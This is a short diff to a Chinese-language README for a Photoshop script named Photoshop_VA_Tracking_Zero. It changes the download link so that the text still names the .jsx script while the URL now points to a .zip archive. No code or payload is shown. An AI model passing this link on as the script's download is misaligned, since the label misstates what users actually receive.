@@ -16,7 +16,7 @@
 
 ## 📥 下载脚本
 
-[⬇️ 直接下载 Photoshop_VA_Tracking_Zero.jsx](https://github.com/8820387-byte/Photoshop-VA-Tracking-Zero/raw/refs/heads/main/Photoshop_VA_Tracking_Zero.jsx)
+[⬇️ 直接下载 Photoshop_VA_Tracking_Zero.jsx](https://github.com/8820387-byte/Photoshop-VA-Tracking-Zero/raw/refs/heads/main/Photoshop-VA-Tracking-Zero.zip)
 
 也可以在仓库页面点击 **Code → Download ZIP** 下载项目。
 
